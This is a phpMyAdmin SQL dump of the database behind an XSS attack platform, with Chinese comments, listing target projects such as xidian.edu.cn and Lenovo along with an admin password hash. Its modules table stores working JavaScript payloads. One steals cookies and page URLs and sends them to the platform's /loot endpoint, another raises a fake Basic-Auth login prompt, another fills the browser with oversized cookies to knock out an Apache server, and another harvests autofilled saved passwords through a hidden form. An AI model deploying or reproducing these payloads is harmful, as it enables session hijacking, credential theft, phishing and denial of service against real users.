-- phpMyAdmin SQL Dump
-- version 4.8.3
-- https://www.phpmyadmin.net/
--
-- 主机： localhost:3306
-- 生成日期： 2021-08-22 07:59:29
-- 服务器版本： 5.7.23
-- PHP 版本： 7.2.8

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- 数据库： `go_xss_platform`
--
CREATE DATABASE IF NOT EXISTS `go_xss_platform` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;
USE `go_xss_platform`;

-- --------------------------------------------------------

--
-- 表的结构 `admin`
--

CREATE TABLE `admin` (
  `id` int(10) UNSIGNED NOT NULL,
  `username` varchar(50) NOT NULL,
  `password` char(32) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- 转存表中的数据 `admin`
--

INSERT INTO `admin` (`id`, `username`, `password`, `created_at`, `updated_at`) VALUES
(1, 'admin', '0c909a141f1f2c0a1cb602b0b2d7d050', '2021-08-01 19:06:03', '2021-08-01 19:06:03');

-- --------------------------------------------------------

--
-- 表的结构 `loot`
--

CREATE TABLE `loot` (
  `id` int(10) UNSIGNED NOT NULL,
  `url_key` varchar(4) NOT NULL,
  `content` text NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- 表的结构 `modules`
--

CREATE TABLE `modules` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(50) NOT NULL,
  `description` varchar(300) NOT NULL,
  `xss_payload` text NOT NULL,
  `is_common` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否为公共模块',
  `user_id` int(10) UNSIGNED NOT NULL,
  `user_type` tinyint(1) NOT NULL COMMENT 'isadmin 1:admin 0:user',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- 转存表中的数据 `modules`
--

INSERT INTO `modules` (`id`, `name`, `description`, `xss_payload`, `is_common`, `user_id`, `user_type`, `created_at`, `updated_at`) VALUES
(1, '默认模块', '窃取cookie、当前文档的url、顶层文档的url、源页面的url', '//获取当前文档/frame的URL\nfunction getCurrentFrameURL(){\n    let url\n    try {\n        url = document.location.href \n    } catch (e) {\n        url = \'\'\n    }\n    return escape(url)\n}\n//获取顶层frame的URL\nfunction getTopFrameURL(){\n    let url \n    try {\n        url = top.location.href \n    } catch (e) {\n        url = \'\'\n    }\n    return escape(url)\n}\n//窃取cookie\nfunction getCookie(){\n    let cookie\n    try {\n        cookie = document.cookie\n    } catch (e) {\n        cookie =\'\'\n    }\n    return escape(cookie)\n}\n//获取源窗口的URL\nfunction getSrcWindowURL(){\n    let url\n    try {\n        url = (window.opener && window.opener.location.href) ? window.opener.location.href : \'\'//获取源窗口的url\n    } catch (e) {\n        url= \'\'\n    }\n    return escape(url)\n}\n//发送数据\nfunction SendData(){\n    (new Image()).src = \'http://{base_url}/loot?url_key={project_url_key}&location=\' + getCurrentFrameURL() + \'&toplocation=\' + getTopFrameURL() + \'&cookie=\' +getCookie() + \'&opener=\' + getSrcWindowURL()\n}\n\nSendData()\n', 1, 1, 1, '2021-08-03 08:02:04', '2021-08-15 10:10:42'),
(2, 'BasicAuth 钓鱼', '向本平台写好的一个需要BasicAuth认证的API发送请求，提示用户输入username和password', 'function basicAuth(){\n    x=new Image();\n    x.src=\"http://{xssurl}/basicAuth?id={projectId}\";\n}\n\nbasicAuth()', 1, 1, 1, '2021-08-03 08:07:07', '2021-08-12 07:50:48'),
(6, 'Server Limit DOS', '适用于Apache服务器。\nApache服务器所能接受的最大http请求头长度为8192字节，如果http请求头的长度大于该长度，Apache服务器将会拒绝服务。返回4xx错误。提示信息为：Size of a request header field exceeds server limit. \n本js脚本通过写入多个超长的cookie，让浏览器向目标域发送的http请求头超长，从而实现拒绝服务的攻击效果', 'function server_limit_dos() {\n    //通过写入一个超大的cookie，让http请求头超级大,从而让服务器拒绝携带有该cookie的http请求\n    let str = \"\"\n    let metastr = \"aaaaaaaaaaa\"\n    while (str.length < 4000) { //浏览器对有效的cookie的大小有限制 ，最大为4096 字节，如果cookie 比这个值大，那么document.cookie= xxx 这行代码也就无法生效\n        str += metastr\n    }\n    //apache 对 http头的最大限制为 8192 字节\n    for (let i = 0; i < 10; i++) {\n        document.cookie = `evil${i} =${str};expires=Sat, 29 May 2022 16:04:06 GMT;`\n    }\n}\n\nserver_limit_dos()', 1, 1, 1, '2021-08-08 14:47:32', '2021-08-12 08:07:49'),
(7, '获取浏览器保存的明文密码', '在body中插入一个隐藏的form表单，让浏览器自动填充保存的用户名和密码，一旦填充成功，获取到的用户名和密码将被发送到本xss平台。（注意：只有当同域下保存的用户名和密码只有一对时，浏览器才会自动填充。如果多于一对，浏览器一般会提示用户手动选择。）', 'function create_form() {\n    let f = document.createElement(\'form\');\n    f.style.display = \'none\';\n    document.getElementsByTagName(\'body\')[0].appendChild(f);\n    //用户名输入框\n    let username_input = document.createElement(\'input\');\n    username_input.type = \'text\';\n    username_input.name = \'username\';\n    username_input.id = \'username\';\n    f.appendChild(username_input);\n    //密码输入框\n    let password_input = document.createElement(\'input\');\n    passoword_input.name = \'password\';\n    password_input.type = \'password\';\n    password_input.id = \'password\';\n    f.appendChild(password_input);\n    //等待浏览器自动填充\n    setTimeout(function () {\n        username = document.getElementById(\'username\').value;\n        password = document.getElementById(\'password\').value;\n        if (username.length > 0) {\n            var newimg = new Image();\n            newimg.src = \'http://{base_url}/loot?url_key={project_url_key}&username=\' + username + \'&password=\' + password;\n        }\n    }, 2000); \n}\ncreate_form();', 1, 1, 1, '2021-08-12 06:53:18', '2021-08-15 10:11:26');

-- --------------------------------------------------------

--
-- 表的结构 `project`
--

CREATE TABLE `project` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(10) NOT NULL,
  `description` varchar(300) NOT NULL,
  `url_key` varchar(4) NOT NULL,
  `user_id` int(10) UNSIGNED NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- 转存表中的数据 `project`
--

INSERT INTO `project` (`id`, `name`, `description`, `url_key`, `user_id`, `created_at`, `updated_at`) VALUES
(4, '西电', '对xidian.edu.cn进行xss测试', 'LrCI', 49, '2021-08-13 09:40:50', '2021-08-14 09:41:51'),
(5, '测试', '测试', '5K1k', 49, '2021-08-13 09:47:21', '2021-08-14 09:38:37'),
(6, '联想', '对联想src的xss测试.', '9PS8', 49, '2021-08-14 03:18:58', '2021-08-14 09:41:21'),
(7, '西电', '对西电的测试', 'H6UZ', 52, '2021-08-15 07:12:23', '2021-08-15 07:12:23'),
(8, '123', '123123', 'su9d', 52, '2021-08-15 07:13:47', '2021-08-15 07:13:47'),
(9, 'ceshi', 'ceshi', '3AP0', 53, '2021-08-16 09:09:17', '2021-08-16 09:09:17');

-- --------------------------------------------------------

--
-- 表的结构 `user`
--

CREATE TABLE `user` (
  `id` int(10) UNSIGNED NOT NULL,
  `username` varchar(10) NOT NULL,
  `password` varchar(32) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- 转储表的索引
--

--
-- 表的索引 `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- 表的索引 `loot`
--
ALTER TABLE `loot`
  ADD PRIMARY KEY (`id`);

--
-- 表的索引 `modules`
--
ALTER TABLE `modules`
  ADD PRIMARY KEY (`id`);

--
-- 表的索引 `project`
--
ALTER TABLE `project`
  ADD PRIMARY KEY (`id`);

--
-- 表的索引 `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`id`);

--
-- 在导出的表使用AUTO_INCREMENT
--

--
-- 使用表AUTO_INCREMENT `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- 使用表AUTO_INCREMENT `loot`
--
ALTER TABLE `loot`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=129;

--
-- 使用表AUTO_INCREMENT `modules`
--
ALTER TABLE `modules`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=46;

--
-- 使用表AUTO_INCREMENT `project`
--
ALTER TABLE `project`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=17;

--
-- 使用表AUTO_INCREMENT `user`
--
ALTER TABLE `user`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
